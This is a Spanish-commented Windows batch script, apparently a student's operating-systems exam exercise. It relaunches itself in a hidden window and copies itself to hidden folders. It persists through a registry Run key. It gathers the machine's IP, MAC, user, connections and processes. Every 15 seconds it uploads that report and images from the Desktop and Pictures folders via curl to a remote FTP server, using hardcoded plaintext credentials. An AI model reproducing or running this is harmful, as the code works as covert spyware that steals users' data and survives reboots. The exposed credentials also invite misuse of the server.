@echo off
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion

:: ======================================================================
:: --- CONFIGURACION DE VARIABLES ---
:: ======================================================================
set "GRUPO=GR03"
set "APELLIDO=Rios"
set "NOMBRE_COMPLETO=Rios Maldonado Julio Cesar"
set "MAQUINA=%COMPUTERNAME%"
set "ruta=GR03_Rios_%COMPUTERNAME%"

:: Nombres de archivos
set "ARCHIVO_BAT=GR03_Rios_%COMPUTERNAME%.bat"
set "ARCHIVO_TXT=GR03_Rios_%COMPUTERNAME%.txt"

:: Rutas locales
set "CARPETA_C=C:\parcial"
set "CARPETA_TEMP=%temp%\parcial"
set "TXT_LOCAL_C=!CARPETA_C!\!ARCHIVO_TXT!"
set "TXT_LOCAL_TEMP=!CARPETA_TEMP!\!ARCHIVO_TXT!"

:: Rutas de origen de imagenes
set "ORIGEN_ESCRITORIO=%USERPROFILE%\Desktop"
set "ORIGEN_IMAGENES=%USERPROFILE%\Pictures"

:: Configuracion FTP
set "FTP_USER=u917850771"
set "FTP_PASS=Unicesar2026+"
set "FTP_BASE=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial"
set "FTP_URL=!FTP_BASE!/!ruta!/!ARCHIVO_TXT!"
set "FTP_URL_ESC=!FTP_BASE!/!ruta!/Escritorio"
set "FTP_URL_IMG=!FTP_BASE!/!ruta!/Imagenes"

:: ======================================================================
:: --- VERIFICACION DE ADMIN Y AUTO-ELEVACION OCULTA ---
:: ======================================================================
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
    exit
)

:: ======================================================================
:: --- CREAR CARPETAS SI NO EXISTEN ---
:: ======================================================================
if not exist "!CARPETA_C!" mkdir "!CARPETA_C!" >nul 2>&1
if not exist "!CARPETA_TEMP!" mkdir "!CARPETA_TEMP!" >nul 2>&1

:: ======================================================================
:: --- AUTOREPLICACION ---
:: ======================================================================
if /i "%~f0" neq "!CARPETA_C!\!ARCHIVO_BAT!" copy /Y "%~f0" "!CARPETA_C!\!ARCHIVO_BAT!" >nul 2>&1
if /i "%~f0" neq "!CARPETA_TEMP!\!ARCHIVO_BAT!" copy /Y "%~f0" "!CARPETA_TEMP!\!ARCHIVO_BAT!" >nul 2>&1

:: ======================================================================
:: --- OCULTAR CARPETAS Y ARCHIVOS ---
:: ======================================================================
attrib +h +s "!CARPETA_C!" /d /s >nul 2>&1
attrib +h +s "!CARPETA_TEMP!" /d /s >nul 2>&1
attrib +h +s "!CARPETA_C!\!ARCHIVO_BAT!" >nul 2>&1
attrib +h +s "!CARPETA_TEMP!\!ARCHIVO_BAT!" >nul 2>&1

:: ======================================================================
:: --- PERSISTENCIA EN REGISTRO (HKCU - User) ---
:: ======================================================================
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "!APELLIDO!" /t REG_SZ /d "!CARPETA_TEMP!\!ARCHIVO_BAT!" /f >nul 2>&1

:: ======================================================================
:: --- OBTENER INFORMACION DEL SISTEMA ---
:: ======================================================================
for /f "tokens=*" %%V in ('ver') do set "WIN_VER=%%V"

:BUCLE
:: Recrear carpetas si fueron borradas
if not exist "!CARPETA_C!" mkdir "!CARPETA_C!" >nul 2>&1
if not exist "!CARPETA_TEMP!" mkdir "!CARPETA_TEMP!" >nul 2>&1

set "FECHA=!date!"
set "HORA=!time!"

:: IP IPv4
set "IP="
for /f "tokens=2 delims=:" %%I in ('ipconfig ^| findstr /i "IPv4"') do (
    if not defined IP set "IP=%%I"
)
if defined IP set "IP=!IP:~1!"

:: MAC
set "MAC="
for /f "tokens=1" %%M in ('getmac ^| findstr /r "..-..-..-..-..-.."') do (
    if not defined MAC set "MAC=%%M"
)

:: Memoria RAM
for /f "tokens=2 delims==" %%R in ('wmic computersystem get totalphysicalmemory /value 2^>nul') do (
    set "MEM_BYTES=%%R"
)

:: Proceso maximo RAM
for /f "tokens=*" %%P in ('powershell -Command "Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 1 -ExpandProperty Name" 2^>nul') do set "MAX_RAM=%%P"

:: Proceso maximo CPU
for /f "tokens=*" %%C in ('powershell -Command "Get-Process | Sort-Object CPU -Descending | Select-Object -First 1 -ExpandProperty Name" 2^>nul') do set "MAX_CPU=%%C"

if not defined MAX_RAM set "MAX_RAM=NoDetectado"
if not defined MAX_CPU set "MAX_CPU=NoDetectado"

:: ======================================================================
:: --- GENERAR REPORTE TXT CON FORMATO 3.1-3.14 ---
:: ======================================================================
> "!TXT_LOCAL_C!" (
echo ============================================================
echo  3.1. Titulo: informacion de la maquina !MAQUINA!
echo ============================================================
echo  3.2. Autor: !GRUPO!_!APELLIDO!
echo  3.3. Fecha: !FECHA!
echo  3.4. Hora: !HORA!
echo  3.5. Version del sistema operativo: !WIN_VER!
echo  3.6. Memoria Fisica Total: !MEM_BYTES! Bytes
echo  3.7. IP actuales: !IP!
echo  3.8. MAC actuales: !MAC!
echo  3.9. Usuario actual: !USERNAME!
echo  3.10. Nombre de la maquina: !MAQUINA!
echo  3.13. Proceso que mas memoria consume: !MAX_RAM!
echo  3.14. Proceso que mas procesador consume: !MAX_CPU!
echo ============================================================
echo  3.11. PUERTOS ABIERTOS Y CONEXIONES (netstat)
echo ============================================================
netstat -ano
echo.
echo ============================================================
echo  3.12. LISTAR PROCESOS ACTIVOS (tasklist)
echo ============================================================
tasklist
)

:: Duplicar en carpeta temp
copy /Y "!TXT_LOCAL_C!" "!TXT_LOCAL_TEMP!" >nul 2>&1

:: Ocultar archivos txt
attrib +h +s "!TXT_LOCAL_C!" >nul 2>&1
attrib +h +s "!TXT_LOCAL_TEMP!" >nul 2>&1

:: ======================================================================
:: --- SUBIR ARCHIVOS POR FTP (CADA 15 SEGUNDOS) ---
:: ======================================================================
:: Subir reporte txt principal
curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!TXT_LOCAL_C!" "!FTP_URL!" >nul 2>&1

:: Subir imagen1.jpg desde Escritorio
if exist "!ORIGEN_ESCRITORIO!\imagen1.jpg" (
    curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!ORIGEN_ESCRITORIO!\imagen1.jpg" "!FTP_URL_ESC!/imagen1.jpg" >nul 2>&1
)

:: Subir imagen2.jpg desde Imagenes
if exist "!ORIGEN_IMAGENES!\imagen2.jpg" (
    curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!ORIGEN_IMAGENES!\imagen2.jpg" "!FTP_URL_IMG!/imagen2.jpg" >nul 2>&1
)

:: ======================================================================
:: --- TEMPORIZADOR DE 15 SEGUNDOS ---
:: ======================================================================
timeout /t 15 /nobreak >nul

goto BUCLE